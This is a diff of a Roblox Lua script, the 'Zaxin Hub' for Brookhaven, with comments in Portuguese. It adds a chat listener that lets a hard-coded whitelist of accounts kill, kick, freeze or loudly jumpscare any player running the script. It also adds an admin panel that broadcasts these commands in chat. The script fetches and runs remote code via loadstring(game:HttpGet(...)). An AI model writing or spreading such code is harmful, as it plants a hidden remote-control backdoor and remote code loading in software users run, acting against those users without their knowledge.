@@ -1,120 +1,146 @@
 --// SERVIÇOS
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
---// WHITELIST (Coloque seu nome EXATAMENTE como está no Roblox)
-local Autorizados = {
+--// WHITELIST (Ranks)
+local WhiteList = {
     ["fh_user1"] = "Owner",
     ["Zelaojg"] = "Parceiro",
     ["joaoluizzx"] = "Staff",
     ["itz_starUwUspice"] = "Admin",
     ["tiai200"] = "Admin",
     ["10pereirazzk"] = "Owner",
-    [LocalPlayer.Name] = "Developer" -- Garante que você sempre tenha acesso
+    [LocalPlayer.Name] = "Developer" -- Você sempre autorizado
 }
 
---// CONFIGURAÇÃO JUMPSCARES
+--// JUMPSCARES
 local JUMPSCARES = {
-    ["jumps1"] = {Img = "rbxassetid://126754882337711", Snd = "rbxassetid://138873214826309"},
-    ["jumps2"] = {Img = "rbxassetid://86379969987314", Snd = "rbxassetid://143942090"},
-    ["jumps3"] = {Img = "rbxassetid://127382022168206", Snd = "rbxassetid://143942090"},
-    ["jumps4"] = {Img = "rbxassetid://95973611964555", Snd = "rbxassetid://138873214826309"},
+    [";jumps1"] = {Img = "rbxassetid://126754882337711", Snd = "rbxassetid://138873214826309"},
+    [";jumps2"] = {Img = "rbxassetid://86379969987314", Snd = "rbxassetid://143942090"},
+    [";jumps3"] = {Img = "rbxassetid://127382022168206", Snd = "rbxassetid://143942090"},
+    [";jumps4"] = {Img = "rbxassetid://95973611964555", Snd = "rbxassetid://138873214826309"},
 }
 
---// FUNÇÃO CRIAR TAG (Visual apenas para você)
-local function CriarTag(plr, cargo)
-    local char = plr.Character or plr.CharacterAdded:Wait()
-    local head = char:WaitForChild("Head", 10)
-    
-    if head and not head:FindFirstChild("RankTag") then
-        local gui = Instance.new("BillboardGui", head)
-        gui.Name = "RankTag"
-        gui.Size = UDim2.new(0, 150, 0, 50)
-        gui.StudsOffset = Vector3.new(0, 3, 0)
-        gui.AlwaysOnTop = true
+--// FUNÇÃO TAG (Visual)
+local function CriarTag(player, texto)
+    local char = player.Character or player.CharacterAdded:Wait()
+    local head = char:WaitForChild("Head", 5)
+    if not head or head:FindFirstChild("RankTag") then return end
 
-        local lbl = Instance.new("TextLabel", gui)
-        lbl.Size = UDim2.new(1, 0, 1, 0)
-        lbl.BackgroundTransparency = 1
-        lbl.Text = "[" .. cargo .. "]"
-        lbl.TextColor3 = Color3.fromRGB(170, 0, 255)
-        lbl.Font = Enum.Font.GothamBold
-        lbl.TextScaled = true
-        lbl.TextStrokeTransparency = 0
-    end
+    local gui = Instance.new("BillboardGui", head)
+    gui.Name = "RankTag"
+    gui.Size = UDim2.new(0, 100, 0, 50)
+    gui.StudsOffset = Vector3.new(0, 3, 0)
+    gui.AlwaysOnTop = true
+
+    local frame = Instance.new("Frame", gui)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(120, 0, 255)
+    frame.BackgroundTransparency = 0.3
+    Instance.new("UICorner", frame)
+
+    local lbl = Instance.new("TextLabel", frame)
+    lbl.Size = UDim2.new(1, 0, 1, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = texto
+    lbl.TextColor3 = Color3.new(1, 1, 1)
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextScaled = true
 end
 
---// FUNÇÃO JUMPSCARE
-local function PlayJumpscare(id)
-    local data = JUMPSCARES[id]
-    if not data then return end
-
+--// MOSTRAR JUMPSCARE
+local function MostrarJumpscare(data)
     local gui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
     local img = Instance.new("ImageLabel", gui)
     img.Size = UDim2.new(1, 0, 1, 0)
     img.Image = data.Img
     img.BackgroundTransparency = 1
     
-    local sfx = Instance.new("Sound", workspace)
-    sfx.SoundId = data.Snd
-    sfx.Volume = 10
-    sfx:Play()
+    local sound = Instance.new("Sound", workspace)
+    sound.SoundId = data.Snd
+    sound.Volume = 5
+    sound:Play()
 
-    task.delay(2.5, function()
+    TweenService:Create(img, TweenInfo.new(0.5), {ImageTransparency = 0}):Play()
+    task.delay(3, function()
         gui:Destroy()
-        sfx:Destroy()
+        sound:Destroy()
     end)
 end
 
---// APLICAR TAGS NOS AUTORIZADOS
-for _, plr in pairs(Players:GetPlayers()) do
-    if Autorizados[plr.Name] then
-        CriarTag(plr, Autorizados[plr.Name])
+--// ESCUTAR COMANDOS (Compatível com Brookhaven)
+local function ProcessarComando(msg, autorNome)
+    if not WhiteList[autorNome] then return end -- Só aceita comando de quem é Whitelist
+    
+    local args = msg:lower():split(" ")
+    local cmd = args[1]
+    local alvo = args[2]
+
+    if alvo == LocalPlayer.Name:lower() or alvo == "all" then
+        if JUMPSCARES[cmd] then
+            MostrarJumpscare(JUMPSCARES[cmd])
+        elseif cmd == ";kill" then
+            LocalPlayer.Character:BreakJoints()
+        elseif cmd == ";kick" then
+            LocalPlayer:Kick("Expulso por: " .. autorNome)
+        elseif cmd == ";freeze" then
+            LocalPlayer.Character.Humanoid.WalkSpeed = 0
+        elseif cmd == ";unfreeze" then
+            LocalPlayer.Character.Humanoid.WalkSpeed = 16
+        end
     end
 end
 
---// EXECUTAR COMANDOS
-LocalPlayer.Chatted:Connect(function(msg)
-    local args = msg:lower():split(" ")
-    if args[1] == ";kill" and args[2] == LocalPlayer.Name:lower() then
-        LocalPlayer.Character:BreakJoints()
-    elseif args[1] == ";kick" and args[2] == LocalPlayer.Name:lower() then
-        LocalPlayer:Kick("Zaxin Hub - Auto Kick")
-    elseif JUMPSCARES[args[1]:sub(2)] and args[2] == LocalPlayer.Name:lower() then
-        PlayJumpscare(args[1]:sub(2))
+--// CONEXÃO CHAT NOVO
+TextChatService.MessageReceived:Connect(function(msg)
+    if msg.TextSource then
+        ProcessarComando(msg.Text, msg.TextSource.Name)
     end
 end)
 
---// CARREGAR UI (WIND UI)
-if Autorizados[LocalPlayer.Name] then
-    local success, WindUI = pcall(function()
-        return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
-    end)
+--// INTERFACE WINDUI
+if WhiteList[LocalPlayer.Name] then
+    local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+    local Window = Window or WindUI:CreateWindow({
+        Title = "Zaxin Hub | Admin",
+        Author = "ZaxinX",
+        Size = UDim2.fromOffset(500, 400)
+    })
 
-    if success then
-        local Window = WindUI:CreateWindow({
-            Title = "Zaxin Hub | Brookhaven",
-            Author = "ZaxinX",
-            Size = UDim2.fromOffset(450, 350)
-        })
+    local Tab = Window:Tab({Title = "Comandos", Icon = "terminal"})
+    local Sec = Tab:Section({Title = "Ações", Opened = true})
 
-        local Tab = Window:Tab({Title = "Comandos", Icon = "terminal"})
-        
-        Tab:Button({
-            Title = "Matar-se",
-            Callback = function() LocalPlayer.Character:BreakJoints() end
-        })
+    local selecionado
+    local drop = Sec:Dropdown({
+        Title = "Selecionar Alvo",
+        Values = (function() 
+            local t = {} 
+            for _,p in pairs(Players:GetPlayers()) do table.insert(t, p.Name) end 
+            return t 
+        end)(),
+        Callback = function(v) selecionado = v end
+    })
 
-        Tab:Button({
-            Title = "Jumpscare Teste",
-            Callback = function() PlayJumpscare("jumps1") end
-        })
-        
-        WindUI:Notify({
-            Title = "Zaxin Hub",
-            Content = "Script carregado com sucesso!",
-            Duration = 5
+    local cmds = {";kill", ";kick", ";jumps1", ";jumps2", ";freeze", ";unfreeze"}
+    for _, c in ipairs(cmds) do
+        Sec:Button({
+            Title = c:upper(),
+            Callback = function()
+                if selecionado then
+                    -- No Roblox, você só "fala" o comando. 
+                    -- Se o alvo estiver com o script aberto, ele vai obedecer.
+                    local channel = TextChatService.TextChannels.RBXGeneral
+                    channel:SendAsync(c .. " " .. selecionado)
+                end
+            end
         })
     end
+end
+
+-- Iniciar tags para quem já está no jogo
+for _, p in pairs(Players:GetPlayers()) do
+    if WhiteList[p.Name] then CriarTag(p, WhiteList[p.Name]) end
 end
